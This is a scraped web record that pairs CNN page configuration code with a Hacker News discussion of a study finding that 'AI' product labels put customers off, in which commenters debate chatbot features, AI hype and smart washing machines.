eaf2ec504f651a8\",\"enabled\":true,\"gatewayUrl\":\"\",\"integration\":\"conviva\"},\"cssUrl\":\"https://registry.api.cnn.io/bundles/fave/latest-4.x/css\",\"enabledPageTypes\":{\"exclude\":{\"article\":[\"studentnews\"],\"section\":[\"studentnews\"],\"video\":[\"studentnews\"]}},\"enableFaveContentXml\":true,\"freewheel\":{\"globalAdTimer\":{\"adComplete\":{\"errorCode\":{\"skip\":\"SKIP_CURRENT_AD_COMPLETE\",\"stop\":\"STOP_CURRENT_AD_COMPLETE\"},\"timeout\":30000,\"type\":\"adComplete\"},\"adWaterfall\":{\"errorCode\":{\"skip\":\"SKIP_CURRENT_AD_WATERFALL\",\"stop\":\"STOP_CURRENT_AD_WATERFALL\"},\"timeout\":30000,\"type\":\"adWaterfall\"},\"enabled\":true,\"errorInfo\":{\"skip\":\"A custom global ad timeout of {timeout} milliseconds caused the skipCurrentAd() function to be invoked. Attempt {skipCurrentAdAttempts} of {maxSkipCurrentAdAttempts}. Type: {type}\",\"stop\":\"The maximum of {maxSkipCurrentAdAttempts} skip current ad attempts has been exceeded causing the stop() function to be invoked. Timeout: {timeout} milliseconds. Type: {type}.\"},\"maxSkipCurrentAdAttempts\":0}},\"iframe\":\"\",\"injectCss\":false,\"injectorJs\":{\"featureName\":\"cnn-fave-lib\",\"source\":\"https://registry.api.cnn.io/bundles/fave/latest-4.x/js\"},\"live\":{\"enabled\":true,\"enabledLiveStreams\":[\"cvplive/cvpstream0\",\"cvplive/cvpstream1\",\"cvplive/cvpstream2\",\"cvplive/cvpstream3\",\"cvplive/cvpstream4\",\"cvplive/cnngo\",\"cvplive/cnniuk\"]},\"mediaPlayer\":\"top\",\"oneTapEnabledPages\":{\"pageTypes\":[\"section\"],\"sections\":[\"homepage\",\"intl_homepage\",\"business\",\"health\",\"opinions\",\"politics\",\"us\",\"world\"]},\"oneClickEnabledPages\":{\"pageTypes\":[\"section\"],\"sections\":[\"homepage\",\"intl_homepage\"]},\"openMeasurement\":{\"enabled\":true},\"optimizely\":{\"enabled\":true},\"player\":{\"autoplay\":{\"compatibility\":{\"testMobile\":true},\"muted\":{\"desktop\":{\"enabled\":true,\"viewportChange\":{\"pauseVideoOnViewportChange\":true,\"playerInViewportPercent\":50}},\"mobile\":{\"enabled\":true,\"viewportChange\":{\"pauseVideoOnViewportChange\":true,\"playerInViewportPercent\":50}},\"unmuteCTA\":{\"variant\":{\"shrink\":false,\"wave\":false}}}},\"autoStopLive\":{\"timeout\":1200000},\"closedCaptionsOn\":false,\"closedCaptionsThreshold\":0.2,\"maxBitrate\":\"1500000\",\"message\":{\"liveOffline\":\"The live stream went offline.Player will resume on rebroadcast.\",\"error\":\"The video player encountered an error.\"},\"poster\":{\"big\":\"768x432\",\"small\":\"640x360\",\"override\":true,\"overrideImages\":{\"big\":\"medium\",\"small\":\"small\"}},\"screenOrientationManager\":{\"fullscreenOnLandscape\":true},\"stateRemembrance\":{\"closedCaptions\":{\"enabled\":true}},\"ui\":{\"theme\":{\"adCountdown\":{\"shouldRender\":false}}},\"vr\":{\"clickAndDragCta\":{\"enabled\":true}}},\"prebid\":{\"enabled\":true},\"server\":{\"medium\":{\"enabled\":true,\"environment\":\"prod\"}},\"stellar\":{\"ads\":{\"default\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"m6Np541neR\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"2iUzxPSeOP\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"5lycn5OPFj\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"33hkbvnyaO\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"ENHa1vBbDp\"}}}},\"fastLiveStreamDesktopWeb\":{\"ssai\":{\"dev\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"5I8NQT75Ti\"}},\"environment\":\"prod\",\"prod\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"5I8NQT75Ti\"}}}},\"fastLiveStreamMobileWeb\":{\"ssai\":{\"dev\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"NwRsq2FBUw\"}},\"environment\":\"prod\",\"prod\":{\"liveUnauth\":{\"enabled\":true,\"profile\":\"NwRsq2FBUw\"}}}},\"livestory\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"N5SsGHrH8R\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"UsIeS2TKlX\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"U0k3XgD9A0\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"sqKNPXeFWm\"},\"liveAuth\":{\"enabled\":true,\"profile\":\"33hkbvnyaO\"},\"liveUnauth\":{\"enabled\":true,\"profile\":\"TBn9mv6qeq\"}}}},\"verticalVideo\":{\"ssai\":{\"dev\":{\"clips\":{\"enabled\":true,\"profile\":\"Fak85icAsl\"}},\"environment\":\"prod\",\"prod\":{\"clips\":{\"enabled\":true,\"profile\":\"38PbsVgxaq\"}}}}},\"fastLiveStreams\":[\"livec76319f599742ab668c8b3ba6dcfed3ce7e817ad\",\"live89dc8d181af9acac4036fff1055df79a4d4ee33d\",\"live51fd6cf689647b6d6ca0bcd2d6f4e69c30dbdc49\",\"livedbcedb554833b248c3ce8374acd2bbcd3983d7dd\",\"live684f447e096731bf9a8dc4a6b1be616c565f0dc8\",\"live24770147cdbffa4a9cac306f6c56b4bf399ba4c4\"],\"mediaPlayer\":\"top\"},\"windows7PreferredFileType\":\"mp4\",\"zion\":{\"bridgeEnabled\":true,\"enabled\":true,\"enableLogging\":false,\"environment\":\"prod\"}},\"TRINITY_CONFIGURATION.domestic.michonne.features.enableAutoplayMuted\":false,\"TRINITY_CONFIGURATION.international.michonne.features.enableAutoplayMuted\":false,\"TRINITY_CONFIGURATION.domestic.michonne.features.enableAutoplayBlock\":false,\"TRINITY_CONFIGURATION.international.michonne.features.enableAutoplayBlock\":false,\"TRINITY_CONFIGURATION.domestic.michonne.ads.adfuelOptionsOverrides\":{\"business\":{},\"default\":{}},\"TRINITY_CONFIGURATION.international.michonne.ads.adfuelOptionsOverrides\":{\"business\":{},\"default\":{}},\"USER_CONSENT_COOKIE\":\"OptanonConsent\",\"USER_CONSENT_COOKIE_DOMAIN\":\".cnn.com\",\"USER_CONSENT_COOKIE_SAMESITE\":\"None\",\"USER_CONSENT_COOKIE_SECURE\":true,\"USER_CONSENT_CONFIRM_COOKIE\":\"OptanonAlertBoxClosed\",\"USER_CONSENT_DOM_ID\":\"3d9a6f21-8e47-43f8-8d58-d86150f3e92b\",\"USER_CONSENT_GPC_FIX_COOKIE\":\"SecGpc\",\"USER_ACCOUNT_AVATAR_BASE_URL\":\"https://d2otbl5v981rj6.cloudfront.net/static/images/avatars/\",\"USER_ACCOUNT_ENABLED\":true,\"USER_ACCOUNT_PAYMENTS_ENABLED\":true,\"USER_ACCOUNT_RESTRICTED_VIEWS_ENABLED\":true,\"USER_SERVICES_ENABLED\":true,\"USER_ACCOUNT_ONBOARDING_ENABLED\":true,\"USER_ACCOUNT_MOTIF_ENABLED\":true,\"US_SUBSCRIPTIONS_ENABLED\":false,\"VIDEO_EMBED_URL\":\"https://fave.api.cnn.io/v1/fav/\",\"AMP_VIDEO_EMBED_URL\":\"https://fave-api.cnn.com/v1/amp/\",\"NEWSLETTER_ACQUISITION_ENABLED\":true,\"NEWSLETTER_LANDING_ACQUISITION_ENABLED\":true,\"WOPR_API_URL\":\"https://wopr.turnerapps.com\",\"WUNDERKIND_SRC\":\"https://tag.bounceexchange.com/340/i.js\",\"ZETA_SITE_ID\":\"cnn\",\"ZETA_CLIENT_HASH_KEY\":\"16b6410431b6374e780104abb0443ca8\",\"ZETA_PARTNER_HASH_KEY\":\"34747f0775f02a6784bb965de6833e73\",\"ZETA_SHORT_NAME\":\"cnn-pixel-8786\",\"ZION_API_KEY\":\"mXFw59FFEpUNOu3aeVJChKAsqAlZ4NEf\",\"ZION_BEHAVIOURAL_ENABLED_PAGE_VARIANTS\":[\"article_leaf\",\"markets\"],\"ZION_CLICK_OBSERVED_COMPONENTS\":[\"footer\",\"gallery\",\"header\",\"related-content\",\"video\",\"image\"],\"ZION_ENV\":\"Prod\",\"ZION_ON_OFF_OBSERVED_COMPONENTS\":[\"bizdev-outbrain\",\"footer\",\"headline\",\"paragraph\",\"related-content\",\"market-tabbed-container\",\"market-fng-indicator\"],\"ZION_SRC\":\"https://z.cdp-dev.cnn.com/zion-web-client/3.0/zion-web-client.min.js\",\"ZION_TELEMETRY_ENDPOINT\":\"//zion-telemetry.api.cnn.io\",\"FAVE_SRC\":\"https://registry.api.cnn.io/bundles/fave/latest-4.x/js\",\"PARSELY_SRC\":\"@parsely_src\",\"SSE_HOST\":\"https://sse01.cnn.com\",\"UNDERSCORED_GET_AFFILIATE_TAG_API_URL\":\"https://bvrmvkrkie.execute-api.us-east-1.amazonaws.com/v1/get-affiliate-tag\",\"UNDERSCORED_API_HOST\":\"web-prod-ursd0001\",\"UNDERSCORED_ACCESS_KEY\":\"produnderscoredaccesskey\",\"MOBILE_GOOGLE_AD_ACCOUNT_ID\":\"8663477\",\"PUBLIC_GOOD_WIDGET_ENABLED\":true,\"PUBLIC_GOOD_WIDGET_SRC\":\"https://assets.publicgood.com/pgm/v1/dpg.js\",\"PUBLIC_GOOD_WIDGET_CONFIG_CLASS\":\"pgs-dpg-btn\",\"PUBLIC_GOOD_WIDGET_CONFIG_PARTNER_ID\":\"cnn\",\"PUBLIC_GOOD_WIDGET_CONFIG_TARGET_TYPE\":\"campaign\",\"MOBILE_WATCH_NEXT_URL\":\"https://prod.di.api.cnn.io/recs/v1/WatchNextVideo\",\"MOBILE_SUPPORTED_SECTIONS\":[\"mobile-app\",\"opinions\",\"world\",\"us\",\"politics\",\"business\",\"health\",\"entertainment\",\"travel\",\"sport\",\"style\",\"videos\",\"weather\",\"homepage\",\"tv\",\"series\",\"wbd\",\"yourcnn\",\"bleacherreport\",\"video_vertical\",\"science\",\"climate\",\"digital-magic-wall\"],\"ENABLE_AMP_EXCLUDE_TEST\":true,\"AMP_EXCLUDE_SECTIONS\":\"[]\",\"AMP_EXCLUDE_PAGE_TYPES\":[\"video\",\"gallery\",\"live-story\"],\"FORCE_WEBP_IMAGES\":true,\"POLITICS_ELECTION_CONTEXT_FEED\":\"https://politics.api.cnn.io/available-races/all/index.json\",\"POLITICS_FEATURE_FLAG_BASEPATH\":\"https://politics-static.cnn.io/2021/feature-flags\",\"POLITICS_FEED_URL_BASEPATH\":\"https://politics.api.cnn.io\",\"POLITICS_MAP_URL_BASEPATH\":\"https://atlas.cnn.io/us\",\"POLITICS_STATIC_ASSETS_BASEPATH\":\"https://politics-static.cnn.io/\",\"RTCCONFIG_APS_PUB_ID\":\"3159\",\"CNN_DATA_API\":\"https://data.api.cnn.io\",\"PLEDGE_DONATION_ENABLED\":true,\"PLEDGE_DONATION_SRC\":\"https://www.pledge.to/assets/widget.js\",\"PLEDGE_DONATION_CONFIG_CLASS\":\"plg-donate\",\"AWS_REGION\":\"us-east-2\",\"ENABLE_UNDERSCORED_NCA\":true,\"APS_SRC\":\"//c.aps.amazon-adsystem.com\",\"NCA_PUB_ID\":\"2c2869f8-bd54-4288-9229-c99eb86c9294\"}Brands should avoid this popular term. It’s turning off customersCNN Business window.CNN = window.CNN || {}; window.CNN.ads = {\"lazyLoad\":true,\"registry\":[{\"rktr_deployed_date\":\"2024-08-13 14:17:43\",\"rktr_slot_id\":\"page\",\"rktr_id\":\"cnn_leaf\",\"gpt_id\":\"8663477\",\"site\":\"cnn_2\",\"root\":\"CNN\",\"child_directed_treatment\":false,\"targeting\":[]},{\"rktr_slot_id\":\"ad_bnr_atf_01\",\"rktr_ad_id\":\"CNN/business/leaf\",\"sizes\":[[1,1],[1,2],[320,50],[728,90],[970,66],[970,90],[970,250],[\"fluid\"]],\"hasInViewRefresh\":true,\"inViewRefreshCount\":\"10\",\"inViewRefreshInterval\":\"35\",\"targeting\":[[\"pos\",[\"bnr_atf_01\"]]],\"responsive\":[[[\"1024\",\"0\"],[[\"970\",\"250\"],[\"970\",\"90\"],[\"970\",\"66\"],[\"728\",\"90\"],[\"1\",\"2\"],[\"1\",\"1\"],[\"fluid\"]]],[[\"728\",\"0\"],[[\"728\",\"90\"],[\"1\",\"2\"],[\"1\",\"1\"],[\"fluid\"]]],[[\"0\",\"0\"],[[\"320\",\"50\"],[\"1\",\"2\"],[\"1\",\"1\"],[\"fluid\"]]]]},{\"rktr_slot_id\":\"ad_rect_atf_01\",\"rktr_ad_id\":\"CNN/business/leaf\",\"sizes\":[[1,1],[1,2],[2,2],[300,250],[300,600],[300,850],[300,1050],[320,320],[\"fluid\"]],\"hasInViewRefresh\":true,\"inViewRefreshCount\":\"10\",\"inViewRefreshInterval\":\"35\",\"targeting\":[[\"pos\",[\"rect_atf_01\"]]],\"responsive\":[[[\"1024\",\"0\"],[[\"300\",\"1050\"],[\"300\",\"850\"],[\"300\",\"600\"],[\"300\",\"250\"],[\"1\",\"1\"],[\"fluid\"]]],[[\"728\",\"0\"],[[\"300\",\"1050\"],[\"300\",\"850\"],[\"300\",\"600\"],[\"300\",\"250\"],[\"1\",\"1\"],[\"fluid\"]]],[[\"0\",\"0\"],[[\"2\",\"2\"],[\"1\",\"1\"],[\"fluid\"]]]]},{\"rktr_slot_id\":\"ad_rect_btf_01\",\"rktr_ad_id\":\"CNN/business/leaf\",\"sizes\":[[1,1],[1,2],[2,2],[300,250],[300,600],[320,320]],\"hasInViewRefresh\":true,\"inViewRefreshCount\":\"10\",\"inViewRefreshInterval\":\"35\",\"targeting\":[[\"pos\",[\"rect_btf_01\"]]],\"responsive\":[[[\"1024\",\"0\"],[[\"300\",\"600\"],[\"300\",\"250\"],[\"fluid\"]]],[[\"728\",\"0\"],[[\"300\",\"600\"],[\"300\",\"250\"],[\"fluid\"]]],[[\"0\",\"0\"],[[\"320\",\"320\"],[\"300\",\"250\"],[\"2\",\"2\"],[\"1\",\"1\"]]]]},{\"rktr_slot_id\":\"ad_nat_btf_01\",\"rktr_ad_id\":\"CNN/business/leaf\",\"sizes\":[[1,1],[1,2],[300,250],[780,175],[\"fluid\"]],\"targeting\":[[\"pos\",[\"nat_btf_01\"]]],\"responsive\":[[[\"1024\",\"0\"],[[\"780\",\"175\"],[\"1\",\"2\"],[\"1\",\"1\"],[\"fluid\"]]],[[\"728\",\"0\"],[[\"1\",\"2\"],[\"1\",\"1\"],[\"fluid\"]]],[[\"0\",\"0\"],[[\"1\",\"1\"],[\"fluid\"]]]]},{\"rktr_slot_id\":\"ad_rect_btf_02\",\"rktr_ad_id\":\"CNN/business/leaf\",\"sizes\":[[1,1],[1,2],[2,2],[300,250],[300,600],[320,320],[\"fluid\"]],\"hasInViewRefresh\":true,\"inViewRefreshCount\":\"10\",\"inViewRefreshInterval\":\"35\",\"targeting\":[[\"pos\",[\"rect_btf_02\"]]],\"responsive\":[[[\"1024\",\"0\"],[[\"300\",\"600\"],[\"300\",\"250\"]]],[[\"728\",\"0\"],[[\"320\",\"320\"],[\"300\",\"600\"],[\"300\",\"250\"]]],[[\"0\",\"0\"],[[\"320\",\"320\"],[\"300\",\"250\"],[\"2\",\"2\"],[\"1\",\"2\"],[\"1\",\"1\"],[\"fluid\"]]]]},{\"rktr_slot_id\":\"ad_ns_atf_01\",\"rktr_ad_id\":\"CNN/business/leaf\",\"sizes\":[[120,60]],\"targeting\":[[\"pos\",[\"ns_atf_01\"]]],\"responsive\":[[[\"1024\",\"0\"],[[\"120\",\"60\"]]],[[\"728\",\"0\"],[[\"120\",\"60\"]]],[[\"0\",\"0\"],[[\"120\",\"60\"]]]]}],\"registryPath\":\"domestic/business/leaf\",\"showAds\":true,\"rktr_ad_id\":\"CNN/business/leaf\"}; window.CNN.cep_topics = {\"cep_brsf\":[],\"cep_iabt\":[\"14TL\",\"159T\",\"159W\",\"14WQ\",\"1597\",\"14VD\"],\"cep_sent\":[\"16BC\"],\"cep_tags\":[\"2PCG\",\"2PCF\",\"2JP9\",\"2PCC\",\"2JP7\",\"2PCD\",\"80N\",\"868\",\"5FT\",\"4ML\",\"4LF\"],\"source_id\":\"article_clzlhnd4h00007lnv9kzzd8v8\",\"short_source_id\":\"ar_clzlhnd4h00007lnv9kzzd8v8\"}; window.CNN.contentModel = { _wedgerId: '', _wedgerLegacyCmsId: '', analytics: { authors: 'Erika Tulfo', chartbeat: { sections: 'business' } }, author: 'Erika Tulfo', brandSite: 'cnn', branding: { key: '', spec: '', displayName: '' }, canonicalUrl: 'https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html', pageStellarId: 'L19wYWdlcy9jbHpsaG5kNGgwMDAwN2xudjlrenpkOHY4', firstCanonicalUrl: 'https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html', cmsId: document.querySelector('html').dataset.uri, commentsEnabled: 'true', edition: false, environment: 'prod', headline: 'Brands should avoid this popular term. It’s turning off customers', isSponsorship: false, last_updated_date: '2024-08-10T13:00:02.375Z', pageType: 'article', pageTags: '', published_date: '2024-08-10T13:00:02.375Z', section: 'business', subsection: '', subsubsection: '', sourceId: 'cms.cnn.com/_pages/clzlhnd4h00007lnv9kzzd8v8', techStack: 'stellar2.0', templateType: 'article_leaf', vertical: 'business' }; window.CNN.omniture = { ...(window.CNN.omniture || {}), branding_content_page: '', cap_author: 'Erika Tulfo', cap_content_type: 'article_leaf', content_id: document.querySelector('html').dataset.uri, content_type: 'adbp:none', gallery_name: '', headline: 'Brands should avoid this popular term. It’s turning off customers', last_updated_date: '2024/08/10', publish_date: '2024/08/10', rs_flag: 'prod', section: [ 'business', '', '' ], source_id: 'cms.cnn.com/_pages/clzlhnd4h00007lnv9kzzd8v8', template_type: 'article_leaf', video_opportunity: document.querySelectorAll('*[data-uri*=\"/_components/video-resource/\"]').length, cap_genre: '', cap_topic: '', screen_state: 'default' }; window.CNN.metadata = {\"content\":{\"author\":[\"Erika Tulfo\"],\"branding\":[],\"byline\":\"By Erika Tulfo, CNN\",\"canonicalUrl\":\"https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html\",\"firstCanonicalUrl\":\"https://www.cnn.com/2024/08/10/business/brands-avoid-term-customers/index.html\",\"headline\":\"Brands should avoid this popular term. It’s turning off customers\",\"identifiers\":{\"pageStellarId\":\"L19wYWdlcy9jbHpsaG5kNGgwMDAwN2xudjlrenpkOHY4\"},\"pageType\":\"article\",\"pageVariant\":\"article_leaf\",\"partner\":{},\"publishDateCreated\":\"2024-08-08T16:24:21.052Z\",\"publishDatePublished\":\"2024-08-10T13:00:02.375Z\",\"publishDateModified\":\"2024-08-10T13:00:02.375Z\",\"section\":[\"business\"],\"topics\":{\"cepBrsf\":[],\"cepIabt\":[\"14TL\",\"159T\",\"159W\",\"14WQ\",\"1597\",\"14VD\"],\"cepOther\":[\"2PCG\",\"2PCF\",\"2JP9\",\"2PCC\",\"2JP7\",\"2PCD\",\"80N\",\"868\",\"5FT\",\"4ML\",\"4LF\"],\"cepSent\":[\"16BC\"],\"cnnSections\":[\"business\"],\"tags\":[]},\"vertical\":\"business\",\"leadingMediaType\":\"image\",\"image\":[{\"identifiers\":{}}]}} window.ntvConfig = window.ntvConfig || {}; window.ntvConfig.keyValues = { ...(window.ntvConfig.keyValues || {}),'section': `business`,'subsection': ``,'page_type': `article_leaf`,'spec': ``,'cep_brsf': ``,'cep_iabt': `14TL,159T,159W,14WQ,1597,14VD`,'cep_sent': `16BC`,'cep_tags': `2PCG,2PCF,2JP9,2PCC,2JP7,2PCD,80N,868,5FT,4ML,4LF`,}; window.CNN.Zion = { ...(window.CNN.Zion || {}),'apiKey': `mXFw59FFEpUNOu3aeVJChKAsqAlZ4NEf`,'environmentType': `Prod`,'sourceId': `cms.cnn.com/_pages/clzlhnd4h00007lnv9kzzd8v8`,}; window.CNN.helpers = { PAGE_VARIANTS: {\"ARTICLE_COMMS\":\"article_comms\",\"ARTICLE_FEATURE\":\"article_feature\",\"ARTICLE_FULLWIDTH\":\"article_fullwidth\",\"ARTICLE_RADIO_ARGENTINA\":\"article_radio_argentina\",\"ARTICLE\":\"article_leaf\",\"GALLERY_UNFURLED\":\"gallery_unfurled\",\"GALLERY\":\"gallery_leaf\",\"HOMEPAGE\":\"landing_homepage\",\"LIVESTORY\":\"article_livestory\",\"TV_CHANNELS\":\"tv_channels\",\"PROFILE\":\"profile\",\"SECTION\":\"landing_section\",\"TVE_FILM\":\"detail\",\"TVE_SERIES\":\"series\",\"TVE_STREAM\":\"network\",\"GENERAL_TOPIC\":\"topic_light\",\"GRIP_TOPIC\":\"topic_grid\",\"SPOTLIGHT_TOPIC\":\"topic_full\",\"ELECTION\":\"election\",\"MARKETS\":\"markets\",\"SPONSOR_ARTICLE\":\"article_sponsor\",\"TVE_BROWSE\":\"browse\",\"VIDEO\":\"video_leaf\",\"VIDEO_SHOW\":\"video_show\",\"UNKNOWN\":\"\"}, PAGE_TYPES: {\"ARTICLE\":\"article\",\"AUDIO\":\"audio\",\"CUSTOM\":\"custom\",\"ELECTION\":\"election-center\",\"FEED\":\"feed\",\"GALLERY\":\"gallery\",\"INTERACTIVE\":\"interactive\",\"LIVESTORY\":\"live-story\",\"NEWSLETTER_LANDING_PAGE\":\"newsletter-landing-page\",\"PROFILE\":\"profile\",\"SCRATCHPAD\":\"scratchpad\",\"SEARCH\":\"search\",\"SECTION\":\"section\",\"STATIC\":\"static\",\"TVE\":\"tve\",\"UNKNOWN\":\"\",\"USER_MANAGEMENT\":\"user-management\",\"VERTICAL_VIDEO\":\"verti",
    "commentLink": "https://news.ycombinator.com/item?id=41231731",
    "commentBody": "Study shows that tacking the “AI” label on products may drive people away (cnn.com)324 points by breadwinner 16 hours agohidepastfavorite291 comments lumb63 6 hours agoI know the “AI label” drives me away. It means the product is unreliable and a black box. The “AI” label also indicates the solution is way over complicated and simpler ways to improve the product have been ignored. For instance, Confluence now has an “AI” chatbot. Search is still substantially worse than grep. reply lolinder 6 hours agoparentWhat's worse is companies replacing their search with an AI chat bot. I noticed that on Amazon the other day—where there used to be a feature where you could search all the Q&As and all the reviews for a product, there's now a chatbot that seems to just be ChatGPT with the product description given as context (if you poke at it you can get it to talk about itself as ChatGPT, so I don't think it's an Amazon model). Completely worthless. There's still a search for reviews, but I can't find one for Q&A or for both together. reply wasteduniverse 3 hours agorootparentI used that chat bot to try and find the dimensions of a product and it couldn't even fetch them from the information table that was right above it in the page. What's the point of working your developers to the bone (as Amazon is famous for doing) if the result is going to be this bad? reply alkonaut 4 hours agoparentprevBecause decisionmakers literally think that potential customers who are comparing products side by side look at whether ProductA has a tick in the \"AI\" column and ProductB doesn't, so A must be better. I think it's as simple as that. They cater to the feature-matrix thing, they get a win for their yearly review because they \"implemented AI\". A good search makes users love your product. But that doesn't show up in a feature matrix, nor is it a great review bullet point to have \"improved the search somewhat\". reply JoshuaRogers 6 hours agoparentprevIf anyone from JetBrains is reading this thread, please take the above to heart. I have yet to have any devs in my circle make the comment that \"the JetBrains AI assistant really saved me time\" but I've heard more than once about how distracting (and generally incorrect) its guesses are. I'd really rather have time invested in making the memory footprint smaller again. reply rurp 3 hours agorootparentJetBrains products are such a dichotomy. The core software is outstanding but for years now I've found almost every update to be net negative. They rarely add new features that I find useful and they spend a lot of time adding useless stuff that adds clutter and hurts performance, or they change existing features for no apparent reason. reply ffsm8 1 hour agorootparentThey probably put product people in charge. Which is an incredibly misguided idea specifically in the context of a developer IDE... I mean I do understand the rationale and value for the job in other contexts. Not so much in this one though. reply ffsm8 1 hour agoparentprevI for one love well implemented AI features. Take immich search for example. No cloud connection, and let's you search for pictures in your library by describing it i.e. a kid with a red jacket on a bicycle... And you get the picture you made, but didn't know exactly when etc. Very rare example though. As a matter of fact, I couldn't name another one right now. reply ToucanLoucan 6 hours agoparentprevIt will never stop being remarkable to me the sheer volume of enterprises of all scales, from the smallest startups to the most massive titans of our industry, all trip over and fall on their faces when it comes to search. A good search feature can turn a great product into an amazing product, and yet seemingly in every product, it is at best, an afterthought. Even Google which forged it's position in the market today off the back of just doing one thing, search, really, really well, has entirely lost it's way and utterly destroyed it's search product on the altar of profit. And now it too is following suit deploying AI as a half-assed solution for that situation. reply javier123454321 6 hours agoparentprevYeah, for example, nerdwallet did an AI search/ask chat GPT about finances feature. I believe that not a single customer asked for their budgeting software to have an AI chatbot. reply tail_exchange 6 hours agorootparentBut how else would they stamp an AI label to their product? Bolt a chatbot onto it, say you are AI-powered, and profit! reply tcgv 5 hours agorootparentI argue the main issue is that many companies have invested significant resources in poorly assessed, designed, and planned AI implementations, rather than focusing on simpler, achievable, and impactful solutions [1] [1] https://thomasvilhena.com/2024/06/easy-wins-for-generative-a... reply jerf 6 hours agorootparentprevIt's even worse than that. It's \"bolt a chatbot on to your product, force it into people's workflow against their will, claim huge usage numbers on your quarterly result calls, stock price goes up\". Not profits, just stock price. The evidence that anybody who isn't \"selling shovels\" has made any significant money yet with AI remains thin. I can't remember if it was Google or Facebook, but in the last earnings season one of them claimed directly that AI has improved their advertising revenue, but the improvement was not terribly out of line from what these companies have been doing for a while (not like suddenly they popped out a revenue triple, it was not obviously out of line with their normal reporting), and I wouldn't be surprised they were doing exactly what I said in my first paragraph. I did not find their claim terribly compelling, even if it was completely true and not just a sop to the stock market. Nobody else is even claiming that AI has increased profits. I'm sure there's some startups with some profits, maybe even very exciting amounts of profit for a startup, but nothing that would move the needle for established companies. In fact we seem to already be in the consolidation phase for the industry, the startups are starting to go under. If we use that as a timer for where we are in the hype cycle, this is underperforming compared to other bubbles; at this point in the dot com crash, while the sector was heavily overinvested it was also quite obvious to a calm observer not panicking about their portfolio that there was definitely a there there, it just wasn't ready to sustain that much investment. There is so far a lot less there there with AI. This hype is going to prove disastrous for the entire technology, I fear. If it was treated as a more normal technology, it would improve, it would be experimented with, companies would learn how to use it, failures would be shaken out and successes doubled down on, and in 3-10 years it would be a healthy industry making reliable, good money with a bright future for growth. But the way the stock market went absolutely ape shit, now the bar is, in roughly 6-12 months if AI has not quintupled the profit margin of all of the already-largest companies on Earth, it is a failure, and so are those companies. We've got a lot of people now with all the incentives in the world to blatently lie about their progress because as soon as they are truthful they become personally bankrupt as their stock options tank. Not because of any particular aspect of AI, except that it wasn't a miracle \"drop it into any process instantly see quintupled profits\", and I'm not inclined to be too annoyed at any technology for failing to be that. And it could take AI down with it. Again. I'd expect the resulting \"AI winter\" to be relatively short this time because the technology really is becoming promising, but the medium-term prospects for the tech are probably a lot dimmer than they theoretically should be because of this disproportionate frenzy. reply 0xTJ 7 hours agoprevI hope it does. It should be a mark against a clothes dryer that it claims to use AI (unless it actually does, wherein I don't see a possible benefit, and wouldn't buy that anyways). Avoid buying products that pointlessly market themselves as \"AI\"; vote with your wallet to punish companies for bad behaviour. If they're doing it for the investors, make tacking on garbage buzzwords like \"AI\" hurt their bottom line. reply elif 7 hours agoparentWhat's the problem with AI washing machines? It analyses the laundry type and size to inform itself on how much detergent to use, analyses the laundry during the wash to know when it is clean enough, monitors the moisture level in the clothes to know when the drying is finished.. it's as if a person is there micromanaging the washing machine.. how is that not an artificial agent? reply mdorazio 7 hours agorootparentExactly zero of that is AI. You've described an extremely basic control loop with a few simple sensors, a lookup table, and some if-then statements. reply CapsAdmin 6 hours agorootparentTangentially, we used to have the term \"smart\" for this. It slowly faded as it became redundant, but now everything is suddenly AI. reply BirAdam 6 hours agorootparentprevIt’s not an LLM (and if it is, what a waste) but it is a limited scope AI of the sort used to control units in a classic RTS. reply elif 7 hours agorootparentprevThat might be how you would implement it, are you refusing to concede that Samsung could have implemented it better than your strawman implementation? What is your standard for intelligence? My washing machine is already better at doing laundry than I am (even if I was in total control of a machine with identical capabilities), why is that not good enough for you? reply oe 6 hours agorootparentI think the point was that every new washing machine already does these things (measures how much detergent to use, checks when the water is clean enough etc.) without any AI. It’s not a very difficult problem domain. reply port19 5 hours agorootparentWe may concede that it could be difficult from an engineering/sensors perspective, but the software side should be about as easy as a traffic light reply Rinzler89 4 hours agorootparentprevHonestly those new smart washing machines with large graphic LCD displays full off sensors to detect the water quality, detergent quantity, how soiled the wash is, etc, are annoying me to hell an back with their constant nagging. \"Oh sorry, your drum is a little light , consider putting more clothes in to save the environment\" I throw another towel in. \"Oh shucks, drum weight overload, consider removing some clothes from the wash\" The problem with the new ones is that they're too smart for their own good and instead of using their smarts to make my life easier (I don't know what can be easier than the old washing machines where you throw the was inside, with the detergent, turn the program knob and push start, and why we need smart ones) they instead use their smarts to be annoying and require more user input and more steps just to fucking wash clothes. reply acdha 1 hour agorootparentprevThe sensor feedback to stop washing is an old feature common for many years. Automatically measuring detergent could be marginally useful if it worked better than human judgement but it’s hard to implement and it’s saving only a few seconds per load, so most people are never going to see a benefit relative to how much more expensive it’d make the machines. Worse, it’s changing a washing machine from a standalone device to an internet-connected computer which needs to regularly get software updates. That adds not just cost but increases the odds that something unrelated to the core functionality will break and make the machine unusable. It also makes them much harder to setup and adds privacy concerns: the last Samsung washing machine I used had an amazingly clunky setup process which required a number of ToS prompts allowing them to resell your data and they insist that you need to grant their app all kinds of permissions on your phone (background location tracking, local network access, Bluetooth scanning, etc.) as part of that process. I am pretty confident that the machine will break before I would ever see a net time savings from not having to measure detergent manually relative to their setup process. I would also be profoundly unsurprised if they get breached or abuse their data collection practices in some way which would be impossible with a regular standalone device. These features are not being added to satisfy user demand and the real customers don’t care about things like privacy or security unless it costs more than they’re making. reply jkman 6 hours agorootparentprevCome on man, I know the majority of the time HN can fall into the dropbox launch \"I can set that up myself 